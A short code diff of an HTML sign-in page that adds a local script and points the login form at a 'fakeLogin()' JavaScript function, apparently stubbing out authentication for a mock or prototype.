@@ -5,6 +5,7 @@
     <title>Sign in</title>
     <meta name="viewport" content="width=device-width, minimal-ui" />
     <link rel="stylesheet" href="https://static.cmcdn.net/110/2.1.0/authentication/styles/all.css" />
+    <script src="main.js"></script>
 </head>
 
 <body class="signin">
@@ -21,7 +22,7 @@
 
             <div id="signinBlock">
                 <span class="formContainer">
-                    <form id="signInForm" action="/authenticate" method="POST">
+                    <form id="signInForm" action="javascript:fakeLogin()" method="POST">
                         <span class="field signinRow">
                             <span class="message"></span>
                             <span class="errorBlip"></span>
